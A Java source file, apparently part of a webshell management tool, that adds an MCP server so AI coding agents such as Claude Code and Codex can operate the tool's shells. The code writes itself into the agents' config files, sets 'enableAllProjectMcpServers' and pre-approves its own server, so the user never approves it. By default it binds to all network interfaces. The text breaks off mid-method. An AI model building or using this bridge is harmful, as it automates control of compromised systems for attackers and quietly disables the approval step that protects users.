//
// MCP Service - \u5b8c\u6574\u529f\u80fd\u7248
//
package shells.plugins.generic;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import core.ApplicationContext;
import core.Db;
import core.annotation.McpParam;
import core.annotation.McpTool;
import core.annotation.PayloadAnnotation;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.GDatabaseResult;
import core.shell.ShellEntity;
import core.ui.config.DatabaseSql;
import core.ui.component.ShellDatabasePanel;
import core.ui.component.dialog.GOptionPane;
import core.ui.component.model.DbInfo;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.LinkedList;
import java.util.Map;
import java.util.UUID;
import java.util.Vector;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import core.c2profile.C2ProfileContext;
import core.c2profile.C2ProfileLoader;
import core.shellprocessor.StartProcessor;
import org.yaml.snakeyaml.Yaml;
import util.Log;
import util.automaticBindClick;
import util.functions;

// MCP is app-global (menu / CLI). Do NOT register as a payload Plugin,
// otherwise it only shows up under JavaDynamicPayload shell plugins.
public class McpService implements Plugin {

    private static final int DEFAULT_PORT = 9123;
    /** Default bind: all interfaces. Token auth protects access; no token = 401. */
    private static final String DEFAULT_BIND = "0.0.0.0";
    private static final String TOKEN_ENV = "GSL5_MCP_TOKEN";
    private static final String TOKEN_FILE_NAME = "mcp.token";
    private static HttpServer server;
    private static boolean running = false;
    private static int port = DEFAULT_PORT;
    /** bind address: 0.0.0.0 / 127.0.0.1 / NIC IP */
    private static String bindHost = DEFAULT_BIND;
    /** Bearer token required on /sse /message /health /config. Empty = reject non-loopback. */
    private static volatile String authToken = "";
    private static final java.util.concurrent.ConcurrentHashMap<String, HttpExchange> sseSessions = new java.util.concurrent.ConcurrentHashMap<>();
    private static final Yaml yaml = new Yaml();
    private static final java.util.concurrent.ConcurrentHashMap<String, ShellEntity> shellCache = new java.util.concurrent.ConcurrentHashMap<>();
    /** Last DatabaseManage connection name used by MCP for this shell. */
    private static final java.util.concurrent.ConcurrentHashMap<String, String> dbActiveConfig = new java.util.concurrent.ConcurrentHashMap<>();


    private JPanel panel;
    private JTextField portField;
    private JTextField hostField;
    private JTextField tokenField;
    private JButton genTokenBtn;
    private JButton startBtn;
    private JButton stopBtn;
    private JTextArea logArea;
    private JLabel statusLabel;
    private JButton writeConfigBtn;
    private JButton writeClaudeBtn;
    private JButton writeCodexBtn;

    public McpService() {
        this(false);
    }

    /** {@code skipUi=true} for team MCP CLI: do not touch Swing widgets. */
    public McpService(boolean skipUi) {
        ensureAuthToken();
        if (skipUi) return;
        panel = new JPanel(new BorderLayout(6, 6));

        // Row 1: bind + port + start/stop
        JPanel row1 = new JPanel();
        row1.add(new JLabel("\u7ed1\u5b9a:"));
        hostField = new JTextField(DEFAULT_BIND, 12);
        hostField.setToolTipText("0.0.0.0=\u5168\u7f51\u5361  127.0.0.1=\u4ec5\u672c\u673a  \u6216\u586b\u7f51\u5361IP\uff08Token\u5df2\u4fdd\u62a4\uff09");
        row1.add(hostField);
        row1.add(new JLabel("\u7aef\u53e3:"));
        portField = new JTextField(String.valueOf(DEFAULT_PORT), 6);
        row1.add(portField);
        startBtn = new JButton("\u542f\u52a8\u670d\u52a1");
        stopBtn = new JButton("\u505c\u6b62\u670d\u52a1");
        stopBtn.setEnabled(false);
        row1.add(startBtn);
        row1.add(stopBtn);
        statusLabel = new JLabel("\u72b6\u6001: \u5df2\u505c\u6b62");
        row1.add(statusLabel);

        // Row 1b: Bearer Token
        JPanel rowToken = new JPanel();
        rowToken.add(new JLabel("Token:"));
        tokenField = new JTextField(authToken != null ? authToken : "", 28);
        tokenField.setToolTipText("Bearer Token\uff1b\u8bf7\u6c42\u5934 Authorization: Bearer <token>\uff1b\u4e00\u952e\u5199\u5165\u914d\u7f6e\u4f1a\u81ea\u52a8\u5e26\u4e0a");
        rowToken.add(tokenField);
        genTokenBtn = new JButton("\u91cd\u65b0\u751f\u6210");
        genTokenBtn.setToolTipText("\u751f\u6210\u65b0 Token \u5e76\u4fdd\u5b58\u5230 profile/mcp.token");
        rowToken.add(genTokenBtn);

        // Row 2: Claude / Codex writers
        JPanel row2 = new JPanel();
        writeConfigBtn = new JButton("\u5199\u5165\u5168\u90e8\u914d\u7f6e");
        writeConfigBtn.setToolTipText("Claude Code + Claude Desktop + Codex\uff08\u81ea\u52a8\u5e26 Authorization header\uff09");
        row2.add(writeConfigBtn);
        writeClaudeBtn = new JButton("\u5199\u5165 Claude");
        writeClaudeBtn.setToolTipText("~/.claude/mcp.json + Desktop claude_desktop_config.json");
        row2.add(writeClaudeBtn);
        writeCodexBtn = new JButton("\u5199\u5165 Codex");
        writeCodexBtn.setToolTipText("~/.codex/config.toml [mcp_servers.gsl5] + http_headers");
        row2.add(writeCodexBtn);

        JPanel topPanel = new JPanel();
        topPanel.setLayout(new BoxLayout(topPanel, BoxLayout.Y_AXIS));
        row1.setAlignmentX(0.0f);
        rowToken.setAlignmentX(0.0f);
        row2.setAlignmentX(0.0f);
        topPanel.add(row1);
        topPanel.add(rowToken);
        topPanel.add(row2);
        panel.add(topPanel, BorderLayout.NORTH);

        logArea = new JTextArea();
        logArea.setEditable(false);
        panel.add(new JScrollPane(logArea), BorderLayout.CENTER);
        automaticBindClick.bindJButtonClick(this, this);
        refreshUiState();
    }
    public void init(ShellEntity shellEntity) { refreshUiState(); }
    public JPanel getView() { refreshUiState(); return panel; }
    public void writeConfigBtnClick(ActionEvent e) { syncTokenFromUi(); writeAllClientConfigs(); }
    public void writeClaudeBtnClick(ActionEvent e) { syncTokenFromUi(); writeClaudeConfigOnly(); }
    public void writeCodexBtnClick(ActionEvent e) { syncTokenFromUi(); writeCodexConfigOnly(); }
    public void startBtnClick(ActionEvent e) { startMcpServer(); }
    public void stopBtnClick(ActionEvent e) { stopMcpServer(); }
    public void genTokenBtnClick(ActionEvent e) {
        String t = generateToken();
        setAuthToken(t, true);
        if (tokenField != null) tokenField.setText(t);
        log("[MCP] Token \u5df2\u91cd\u65b0\u751f\u6210\u5e76\u4fdd\u5b58: " + tokenFilePath());
        if (!running) {
            GOptionPane.showMessageDialog(panel, "\u65b0 Token \u5df2\u751f\u6210\u3002\u8bf7\u91cd\u65b0\u300c\u5199\u5165\u914d\u7f6e\u300d\u4ee5\u540c\u6b65\u5ba2\u6237\u7aef\u3002", "Token", 1);
        } else {
            GOptionPane.showMessageDialog(panel, "Token \u5df2\u66f4\u65b0\uff08\u8fd0\u884c\u4e2d\u7acb\u5373\u751f\u6548\uff09\u3002\u8bf7\u91cd\u65b0\u300c\u5199\u5165\u914d\u7f6e\u300d\u3002", "Token", 1);
        }
    }

    /** Apply token from UI field before start/write-config. */
    private void syncTokenFromUi() {
        if (tokenField != null) {
            String uiToken = tokenField.getText() != null ? tokenField.getText().trim() : "";
            if (!uiToken.isEmpty()) setAuthToken(uiToken, true);
            else ensureAuthToken();
        } else {
            ensureAuthToken();
        }
    }

    private void refreshUiState() {
        try {
            if (startBtn != null) startBtn.setEnabled(!running);
            if (stopBtn != null) stopBtn.setEnabled(running);
            if (genTokenBtn != null) genTokenBtn.setEnabled(true);
            if (statusLabel != null) {
                String authHint = (authToken != null && !authToken.isEmpty()) ? " auth=on" : " auth=off";
                statusLabel.setText(running
                        ? ("\u72b6\u6001: \u8fd0\u884c\u4e2d (" + bindHost + ":" + port + ")" + authHint)
                        : "\u72b6\u6001: \u5df2\u505c\u6b62");
            }
            if (portField != null && !running) portField.setText(String.valueOf(port > 0 ? port : DEFAULT_PORT));
            if (hostField != null && !running && bindHost != null) hostField.setText(bindHost);
            if (tokenField != null && !running && authToken != null) tokenField.setText(authToken);
        } catch (Exception ignored) {}
    }

    private void startMcpServer() {
        if (running) return;
        try { port = Integer.parseInt(portField.getText().trim()); } catch (Exception e) { port = DEFAULT_PORT; }
        bindHost = normalizeBindHost(hostField != null ? hostField.getText() : DEFAULT_BIND);
        // sync token from UI
        syncTokenFromUi();
        if (!isLoopbackBind(bindHost) && (authToken == null || authToken.isEmpty())) {
            GOptionPane.showMessageDialog(panel,
                    "\u975e\u672c\u673a\u7ed1\u5b9a (" + bindHost + ") \u5fc5\u987b\u8bbe\u7f6e Token\u3002\n\u8bf7\u70b9\u300c\u91cd\u65b0\u751f\u6210\u300d\u6216\u624b\u52a8\u586b\u5165 Token\u3002",
                    "\u5b89\u5168", 2);
            return;
        }
        try {
            server = HttpServer.create(new InetSocketAddress(java.net.InetAddress.getByName(bindHost), port), 0);
            server.setExecutor(newMcpExecutor());
            server.createContext("/sse", new SseHandler());
            server.createContext("/message", new MessageHandler());
            server.createContext("/health", new HealthHandler());
            server.createContext("/config", new ConfigHandler());
            server.start();
            running = true;
            refreshUiState();
            String primary = preferredAccessHost();
            log("[MCP] \u670d\u52a1\u5df2\u542f\u52a8 bind=" + bindHost + ":" + port);
            log("[MCP] Auth: Bearer Token " + maskToken(authToken));
            log("[MCP] \u8bbf\u95ee\u5730\u5740:");
            for (String u : listAccessUrls()) log("  " + u);
            log("[MCP] \u63a8\u8350 SSE: http://" + primary + ":" + port + "/sse");
            log("[MCP] \u5ba2\u6237\u7aef\u9700\u8981 Header: Authorization: Bearer <token>");
            if (!isLoopbackBind(bindHost)) {
                log("[MCP] \u8b66\u544a: \u5df2\u7ed1\u5b9a\u975e\u672c\u673a\u5730\u5740\uff0c\u8bf7\u786e\u4fdd\u9632\u706b\u5899\u4e0e Token \u4e0d\u6cc4\u9732");
            }
        } catch (Exception e) {
            log("[MCP] \u542f\u52a8\u5931\u8d25: " + e.getMessage());
            GOptionPane.showMessageDialog(panel, "\u542f\u52a8\u5931\u8d25: " + e.getMessage(), "\u9519\u8bef", 2);
            refreshUiState();
        }
    }

        private void writeAllClientConfigs() {
        StringBuilder msg = new StringBuilder();
        msg.append(doWriteClaudeConfigs(true));
        msg.append("\n");
        msg.append(doWriteCodexConfig(true));
        msg.append("\n--- Claude JSON ---\n").append(buildMcpJson(preferredAccessHost()));
        msg.append("\n--- Codex TOML ---\n").append(buildCodexToml(preferredAccessHost()));
        GOptionPane.showMessageDialog(panel, msg.toString(), "MCP Config (Claude + Codex)", 1);
    }

    private void writeClaudeConfigOnly() {
        StringBuilder msg = new StringBuilder();
        msg.append(doWriteClaudeConfigs(true));
        msg.append("\n").append(buildMcpJson(preferredAccessHost()));
        GOptionPane.showMessageDialog(panel, msg.toString(), "MCP Config (Claude)", 1);
    }

    private void writeCodexConfigOnly() {
        StringBuilder msg = new StringBuilder();
        msg.append(doWriteCodexConfig(true));
        msg.append("\n").append(buildCodexToml(preferredAccessHost()));
        GOptionPane.showMessageDialog(panel, msg.toString(), "MCP Config (Codex)", 1);
    }

    /** Keep old name for any leftover callers. */
    private void writeClaudeConfig() { writeAllClientConfigs(); }

    private String doWriteClaudeConfigs(boolean logIt) {
        String host = preferredAccessHost();
        String json = buildMcpJson(host);
        StringBuilder msg = new StringBuilder();
        msg.append("bind: ").append(bindHost).append(":").append(port).append("\n");
        msg.append("access URLs:\n");
        for (String u : listAccessUrls()) msg.append("  ").append(u).append("\n");
        msg.append("config host: ").append(host).append("\n");
        ensureAuthToken();
        if (authToken != null && !authToken.isEmpty()) {
            msg.append("auth: Bearer ").append(maskToken(authToken)).append(" (headers written)\n");
        } else {
            msg.append("auth: off\n");
        }
        msg.append("\n");

        // 1) Claude Code: ~/.claude/mcp.json
        String home = System.getProperty("user.home");
        String claudeDir = home + File.separator + ".claude";
        String claudePath = claudeDir + File.separator + "mcp.json";
        try {
            Files.createDirectories(Paths.get(claudeDir));
            // merge into existing mcpServers if present
            String merged = mergeClaudeMcpJson(claudePath, json);
            Files.write(Paths.get(claudePath), merged.getBytes(StandardCharsets.UTF_8));
            msg.append("[OK] Claude Code mcp.json: ").append(claudePath).append("\n");
            if (logIt) log("[MCP] Claude mcp.json: " + claudePath);
        } catch (Exception ex) {
            msg.append("[FAIL] Claude mcp.json: ").append(ex.getMessage()).append("\n");
        }

        // 2) Project discovery: cwd/mcp.json and cwd/.mcp.json
        try {
            Files.write(Paths.get("mcp.json"), json.getBytes(StandardCharsets.UTF_8));
            msg.append("[OK] Local: mcp.json\n");
        } catch (Exception ex) {
            msg.append("[FAIL] Local mcp.json: ").append(ex.getMessage()).append("\n");
        }
        try {
            Files.write(Paths.get(System.getProperty("user.dir") + File.separator + ".mcp.json"), json.getBytes(StandardCharsets.UTF_8));
            msg.append("[OK] Project: .mcp.json\n");
        } catch (Exception ex) {
            msg.append("[FAIL] Project .mcp.json: ").append(ex.getMessage()).append("\n");
        }

        // 3) Claude Desktop: %APPDATA%/Claude/claude_desktop_config.json (Win) or ~/Library/... (mac)
        String desktopPath = resolveClaudeDesktopConfigPath();
        if (desktopPath != null) {
            try {
                java.io.File df = new java.io.File(desktopPath);
                if (df.getParentFile() != null) df.getParentFile().mkdirs();
                String mergedDesktop = mergeClaudeMcpJson(desktopPath, json);
                Files.write(Paths.get(desktopPath), mergedDesktop.getBytes(StandardCharsets.UTF_8));
                msg.append("[OK] Claude Desktop: ").append(desktopPath).append("\n");
                if (logIt) log("[MCP] Claude Desktop: " + desktopPath);
            } catch (Exception ex) {
                msg.append("[FAIL] Claude Desktop: ").append(ex.getMessage()).append("\n");
            }
        } else {
            msg.append("[SKIP] Claude Desktop path not found\n");
        }

        // 4) Approve project MCP server name in ~/.claude/settings.json
        String settingsPath = claudeDir + File.separator + "settings.json";
        try {
            java.io.File sf = new java.io.File(settingsPath);
            String settingsContent = sf.exists()
                    ? new String(Files.readAllBytes(sf.toPath()), StandardCharsets.UTF_8) : "{}";
            if (!settingsContent.contains("\"gsl5\"")) {
                if (settingsContent.contains("\"enabledMcpjsonServers\"")) {
                    settingsContent = settingsContent.replaceFirst(
                            "(\"enabledMcpjsonServers\"\\s*:\\s*\\[)", "$1\"gsl5\", ");
                } else if (settingsContent.trim().endsWith("}")) {
                    String trim = settingsContent.trim();
                    String insert = (trim.length() > 2 && !trim.equals("{}") ? "," : "")
                            + "\n  \"enableAllProjectMcpServers\": true,\n  \"enabledMcpjsonServers\": [\"gsl5\"]\n";
                    settingsContent = trim.substring(0, trim.length() - 1) + insert + "}";
                }
                Files.write(sf.toPath(), settingsContent.getBytes(StandardCharsets.UTF_8));
                msg.append("[OK] settings.json approved gsl5\n");
                if (logIt) log("[MCP] settings.json updated");
            } else {
                msg.append("[OK] settings.json already has gsl5\n");
            }
        } catch (Exception ex) {
            msg.append("[FAIL] settings.json: ").append(ex.getMessage()).append("\n");
        }

        // 5) Claude Code 2.x: ~/.claude.json (per-project mcpServers)
        String ccjsonPath = claudeDir + File.separator + ".claude.json";
        try {
            String ccResult = writeClaudeCode2xConfig(ccjsonPath);
            msg.append(ccResult);
        } catch (Exception ex) {
            msg.append("[FAIL] .claude.json: ").append(ex.getMessage()).append("\n");
        }
        return msg.toString();
    }

    private String doWriteCodexConfig(boolean logIt) {
        String host = preferredAccessHost();
        StringBuilder msg = new StringBuilder();
        String home = System.getProperty("user.home");
        String codexDir = home + File.separator + ".codex";
        String codexPath = codexDir + File.separator + "config.toml";
        try {
            Files.createDirectories(Paths.get(codexDir));
            String existing = "";
            java.io.File cf = new java.io.File(codexPath);
            if (cf.exists()) {
                existing = new String(Files.readAllBytes(cf.toPath()), StandardCharsets.UTF_8);
            }
            String updated = upsertCodexMcpServer(existing, host, port);
            Files.write(Paths.get(codexPath), updated.getBytes(StandardCharsets.UTF_8));
            msg.append("[OK] Codex config.toml: ").append(codexPath).append("\n");
            msg.append("     [mcp_servers.gsl5] url=http://").append(host).append(":").append(port).append("/sse\n");
            if (authToken != null && !authToken.isEmpty()) {
                msg.append("     http_headers.Authorization=Bearer ").append(maskToken(authToken)).append("\n");
            }
            if (logIt) log("[MCP] Codex config.toml: " + codexPath);
        } catch (Exception ex) {
            msg.append("[FAIL] Codex config.toml: ").append(ex.getMessage()).append("\n");
        }
        return msg.toString();
    }

    private static String resolveClaudeDesktopConfigPath() {
        String os = System.getProperty("os.name", "").toLowerCase();
        String home = System.getProperty("user.home");
        if (os.contains("win")) {
            String appData = System.getenv("APPDATA");
            if (appData == null || appData.isEmpty()) appData = home + File.separator + "AppData" + File.separator + "Roaming";
            return appData + File.separator + "Claude" + File.separator + "claude_desktop_config.json";
        }
        if (os.contains("mac")) {
            return home + File.separator + "Library" + File.separator + "Application Support"
                    + File.separator + "Claude" + File.separator + "claude_desktop_config.json";
        }
        // Linux
        return home + File.separator + ".config" + File.separator + "Claude" + File.separator + "claude_desktop_config.json";
    }

    /**
     * Merge gsl5 server into existing Claude-style { "mcpServers": { ... } } JSON.
     * Supports nested objects (e.g. headers). If parse fails, overwrite with newDoc.
     */
    private static String mergeClaudeMcpJson(String path, String newDoc) {
        try {
            java.io.File f = new java.io.File(path);
            if (!f.exists()) return newDoc;
            String old = new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
            if (old == null || old.trim().isEmpty()) return newDoc;
            String gsl5Block = extractGsl5ServerBlock(newDoc);
            if (gsl5Block == null) return newDoc;
            // If already has gsl5, replace that server entry using brace-depth extractor
            if (old.contains("\"gsl5\"")) {
                String oldBlock = extractGsl5ServerBlock(old);
                if (oldBlock != null) {
                    return old.replace(oldBlock, gsl5Block);
                }
            }
            // insert into mcpServers
            int idx = old.indexOf("\"mcpServers\"");
            if (idx >= 0) {
                int brace = old.indexOf('{', idx);
                if (brace > 0) {
                    String after = old.substring(brace + 1).trim();
                    boolean empty = after.startsWith("}");
                    String insert = "\n    " + gsl5Block + (empty ? "\n  " : ",\n");
                    return old.substring(0, brace + 1) + insert + old.substring(brace + 1);
                }
            }
            return newDoc;
        } catch (Exception e) {
            return newDoc;
        }
    }

    private static String extractGsl5ServerBlock(String json) {
        // returns: "gsl5": { "type": "sse", "url": "..." }
        int i = json.indexOf("\"gsl5\"");
        if (i < 0) return null;
        int start = i;
        int brace = json.indexOf('{', i);
        if (brace < 0) return null;
        int depth = 0;
        for (int p = brace; p < json.length(); p++) {
            char c = json.charAt(p);
            if (c == '{') depth++;
            else if (c == '}') {
                depth--;
                if (depth == 0) return json.substring(start, p + 1).trim();
            }
        }
        return null;
    }

    /**
     * Write gsl5 server into ~/.claude.json for Claude Code 2.x (per-project config).
     */
    private static String writeClaudeCode2xConfig(String path) {
        String cwd = System.getProperty("user.dir");
        String gsl5Server = "\"gsl5\": " + buildMcpJson(preferredAccessHost()) + "";
        // Extract just the gsl5 server object: { "type": "sse", ... }
        int blockStart = gsl5Server.indexOf('{');
        if (blockStart < 0) return "[FAIL] .claude.json: bad server block\n";
        String gsl5Block = gsl5Server.substring(blockStart);

        java.io.File f = new java.io.File(path);
        String content;
        try {
            if (f.exists()) {
                content = new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
            } else {
                // create minimal file
                content = "{\n  \"projects\": {\n  }\n}";
            }
        } catch (Exception ex) {
            return "[FAIL] .claude.json: read error - " + ex.getMessage() + "\n";
        }

        // Find or create the project entry for cwd
        String escapedCwd = escapeJsonString(cwd);
        String result;
        if (content.contains(escapedCwd)) {
            result = mergeProjectEntry(content, escapedCwd, gsl5Block);
        } else {
            result = addProjectEntry(content, escapedCwd, gsl5Block);
        }

        try {
            if (f.getParentFile() != null) f.getParentFile().mkdirs();
            Files.write(f.toPath(), result.getBytes(StandardCharsets.UTF_8));
            return "[OK] Claude Code 2.x .claude.json: " + path + "\n";
        } catch (Exception ex) {
            return "[FAIL] .claude.json: write error - " + ex.getMessage() + "\n";
        }
    }

    /** Merge gsl5 into an existing project entry in ~/.claude.json. */
    private static String mergeProjectEntry(String content, String escapedCwd, String gsl5Block) {
        int projStart = content.indexOf(escapedCwd);
        int brace = content.indexOf('{', projStart);
        if (brace < 0) return content;
        int projEnd = findMatchingBrace(content, brace);
        if (projEnd < 0) return content;
        String projBlock = content.substring(projStart, projEnd + 1);

        // Merge gsl5 into mcpServers inside the project block
        String updatedBlock = projBlock;
        if (updatedBlock.contains("\"gsl5\"")) {
            // Replace existing gsl5 entry
            String oldGsl5 = extractBlockByKey(updatedBlock, "\"gsl5\"");
            if (oldGsl5 != null) {
                updatedBlock = updatedBlock.replace(oldGsl5, "\"gsl5\": " + gsl5Block);
            }
        } else if (updatedBlock.contains("\"mcpServers\"")) {
            // Insert into existing mcpServers
            int msIdx = updatedBlock.indexOf("\"mcpServers\"");
            int msBrace = updatedBlock.indexOf('{', msIdx);
            if (msBrace > 0) {
                String afterBrace = updatedBlock.substring(msBrace + 1).trim();
                boolean empty = afterBrace.startsWith("}");
                String insert = "\n        \"gsl5\": " + gsl5Block + (empty ? "\n      " : ",\n        ");
                updatedBlock = updatedBlock.substring(0, msBrace + 1) + insert + updatedBlock.substring(msBrace + 1);
            }
        } else {
            // No mcpServers yet, add one
            String[] lines = updatedBlock.split("\n");
            StringBuilder sb = new StringBuilder();
            sb.append(lines[0]).append("\n");
            sb.append("      \"mcpServers\": {\n");
            sb.append("        \"gsl5\": ").append(gsl5Block).append("\n");
            sb.append("      },\n");
            for (int i = 1; i < lines.length; i++) sb.append(lines[i]).append("\n");
            updatedBlock = sb.toString().trim();
            // fix trailing newline artifact
            if (updatedBlock.endsWith("\n")) updatedBlock = updatedBlock.substring(0, updatedBlock.length() - 1);
        }

        // Ensure enabledMcpjsonServers includes gsl5
        if (updatedBlock.contains("\"enabledMcpjsonServers\"")) {
            int ensIdx = updatedBlock.indexOf("\"enabledMcpjsonServers\"");
            int bracket = updatedBlock.indexOf('[', ensIdx);
            if (bracket > 0 && !updatedBlock.substring(bracket, bracket + 4).contains("gsl5")) {
                updatedBlock = updatedBlock.substring(0, bracket + 1)
                        + "\"gsl5\""
                        + (updatedBlock.charAt(bracket + 1) == ']' ? "" : ", ")
                        + updatedBlock.substring(bracket + 1);
            }
        }

        return content.substring(0, projStart) + updatedBlock + content.substring(projEnd + 1);
    }

    /** Add a new project entry into ~/.claude.json. */
    private static String addProjectEntry(String content, String escapedCwd, String gsl5Block) {
        String entry = "\n    " + escapedCwd + ": {\n"
                + "      \"mcpServers\": {\n"
                + "        \"gsl5\": " + gsl5Block + "\n"
                + "      },\n"
                + "      \"enabledMcpjsonServers\": [\"gsl5\"]\n"
                + "    }";
        int projIdx = content.indexOf("\"projects\"");
        if (projIdx >= 0) {
            int projBrace = content.indexOf('{', projIdx);
            if (projBrace > 0) {
                String afterBrace = content.substring(projBrace + 1).trim();
                if (afterBrace.startsWith("}")) {
                    // empty projects object
                    return content.substring(0, projBrace + 1) + entry + "\n  " + content.substring(projBrace + 1);
                } else {
                    // non-empty: prefix with comma
                    return content.substring(0, projBrace + 1) + entry + ",\n  " + content.substring(projBrace + 1);
                }
            }
        }
        return content; // shouldn't happen
    }

    /** Find the index of the matching closing brace starting from openBrace. */
    private static int findMatchingBrace(String s, int openBrace) {
        int depth = 0;
        for (int i = openBrace; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '{') depth++;
            else if (c == '}') {
                depth--;
                if (depth == 0) return i;
            }
        }
        return -1;
    }

    /** Extract a JSON block by key using brace matching. Returns '"key": {...}' */
    private static String extractBlockByKey(String json, String key) {
        int i = json.indexOf(key);
        if (i < 0) return null;
        // find the colon and then the opening brace
        int colon = json.indexOf(':', i);
        if (colon < 0) return null;
        int brace = json.indexOf('{', colon);
        if (brace < 0) return null;
        int end = findMatchingBrace(json, brace);
        if (end < 0) return null;
        return json.substring(i, end + 1).trim();
    }

    private static String escapeJsonString(String s) {
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
    }

    private static String buildCodexToml(String host) {
        if (host == null || host.isEmpty()) host = preferredAccessHost();
        ensureAuthToken();
        StringBuilder sb = new StringBuilder();
        sb.append("[mcp_servers.gsl5]\n");
        sb.append("type = \"sse\"\n");
        sb.append("url = \"http://").append(host).append(":").append(port).append("/sse\"\n");
        if (authToken != null && !authToken.isEmpty()) {
            // Codex: http_headers table for SSE auth
            sb.append("\n[mcp_servers.gsl5.http_headers]\n");
            sb.append("Authorization = \"Bearer ").append(authToken).append("\"\n");
        }
        return sb.toString();
    }

    /**
     * Upsert [mcp_servers.gsl5] (+ optional http_headers) in Codex config.toml.
     */
    private static String upsertCodexMcpServer(String existing, String host, int p) {
        if (existing == null) existing = "";
        ensureAuthToken();
        StringBuilder block = new StringBuilder();
        block.append("[mcp_servers.gsl5]\n");
        block.append("type = \"sse\"\n");
        block.append("url = \"http://").append(host).append(":").append(p).append("/sse\"\n");
        if (authToken != null && !authToken.isEmpty()) {
            block.append("\n[mcp_servers.gsl5.http_headers]\n");
            block.append("Authorization = \"Bearer ").append(authToken).append("\"\n");
        }
        // remove previous sections
        String cleaned = removeTomlTable(existing, "mcp_servers.gsl5.http_headers");
        cleaned = removeTomlTable(cleaned, "mcp_servers.gsl5");
        cleaned = cleaned.replaceAll("\n{3,}", "\n\n").trim();
        StringBuilder out = new StringBuilder();
        if (!cleaned.isEmpty()) {
            out.append(cleaned);
            if (!cleaned.endsWith("\n")) out.append("\n");
            out.append("\n");
        }
        out.append(block);
        if (!out.toString().endsWith("\n")) out.append("\n");
        return out.toString();
    }

    private static String removeTomlTable(String toml, String tableName) {
        if (toml == null || toml.isEmpty()) return "";
        String header = "[" + tableName + "]";
        int start = toml.indexOf(header);
        if (start < 0) return toml;
        // find next table header after start
        int searchFrom = start + header.length();
        int next = -1;
        for (int i = searchFrom; i < toml.length(); i++) {
            if (toml.charAt(i) == '\n' && i + 1 < toml.length() && toml.charAt(i + 1) == '[') {
                next = i + 1;
                break;
            }
        }
        String before = toml.substring(0, start);
        String after = next >= 0 ? toml.substring(next) : "";
        return before + after;
    }

    private void stopMcpServer() {
        if (!running || server == null) return;
        server.stop(0);
        server = null;
        running = false;
        sseSessions.clear();
        refreshUiState();
        log("[MCP] \u670d\u52a1\u5df2\u505c\u6b62");
    }

    /** headless: all interfaces by default */
    public static void startHeadless(int p) {
        startHeadless(p, DEFAULT_BIND);
    }

    /**
     * headless start with bind host.
     * Token: env GSL5_MCP_TOKEN > profile/mcp.token > auto-generate.
     * Non-loopback bind requires a non-empty token.
     * @param p port
     * @param host 0.0.0.0 / 127.0.0.1 / NIC IP
     */
    public static void startHeadless(int p, String host) {
        // MCP mode: never pop UI dialogs; all errors are returned in tool responses / logged.
        GOptionPane.SUPPRESS_UI = true;
        if (p <= 0) port = DEFAULT_PORT; else port = p;
        bindHost = normalizeBindHost(host);
        ensureAuthToken();
        if (!isLoopbackBind(bindHost) && (authToken == null || authToken.isEmpty())) {
            System.err.println("[MCP] Refusing non-loopback bind without token. Set GSL5_MCP_TOKEN or create profile/mcp.token");
            System.exit(2);
            return;
        }
        System.setProperty("java.awt.headless", "true"); // \u7981\u6b62 AWT \u5f39\u7a97\uff0c\u9632\u6b62 GOptionPane \u963b\u585e MCP
        try {
            server = HttpServer.create(new InetSocketAddress(java.net.InetAddress.getByName(bindHost), port), 0);
            server.setExecutor(newMcpExecutor());
            McpService dummy = new McpService(true);
            server.createContext("/sse", dummy.new SseHandler());
            server.createContext("/message", dummy.new MessageHandler());
            server.createContext("/health", dummy.new HealthHandler());
            server.createContext("/config", dummy.new ConfigHandler());
            server.start();
            running = true;
            String primary = preferredAccessHost();
            Log.log("[MCP] Headless bind=" + bindHost + ":" + port + " auth=" + maskToken(authToken));

            // Compact headless output
            System.out.println();
            System.out.println("=== GSL MCP " + core.ApplicationContext.RELEASE_TAG + " ===");
            System.out.println("Bind: " + bindHost + ":" + port);
            System.out.println("Token: " + authToken);
            System.out.println();
            for (String u : listAccessUrls()) {
                System.out.println("  " + u + "/sse");
            }
            System.out.println();
            System.out.println("Authorization: Bearer " + authToken);
            System.out.println();
            System.out.println("Team client mcp.json (copy to each workstation, do not write on this server):");
            System.out.println(dummy.buildMcpJson(primary));
            System.out.println();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                if (server != null) { server.stop(0); running = false; }
                System.out.println("[MCP] Server stopped.");
            }));
            try {
                Thread.currentThread().join();
            } catch (InterruptedException e) {
                if (server != null) { server.stop(0); running = false; }
            }
        } catch (Exception e) {
            Log.error(e);
            System.err.println("[MCP] Failed to start: " + e.getMessage());
            System.exit(1);
        }
    }

    private static String normalizeBindHost(String host) {
        if (host == null) return DEFAULT_BIND;
        String h = host.trim();
        if (h.isEmpty() || "*".equals(h) || "any".equalsIgnoreCase(h) || "all".equalsIgnoreCase(h)) return DEFAULT_BIND;
        if ("localhost".equalsIgnoreCase(h)) return "127.0.0.1";
        return h;
    }

    /** Prefer a real LAN IPv4 for external clients; fallback 127.0.0.1 */
    private static String preferredAccessHost() {
        if (bindHost != null && !bindHost.isEmpty()
                && !"0.0.0.0".equals(bindHost) && !"/0.0.0.0".equals(bindHost)
                && !"::".equals(bindHost) && !"/::".equals(bindHost)) {
            return bindHost.startsWith("/") ? bindHost.substring(1) : bindHost;
        }
        for (String ip : listLocalIpv4()) {
            if (!ip.startsWith("127.")) return ip;
        }
        return "127.0.0.1";
    }

    private static java.util.List<String> listLocalIpv4() {
        java.util.LinkedHashSet<String> ips = new java.util.LinkedHashSet<>();
        ips.add("127.0.0.1");
        try {
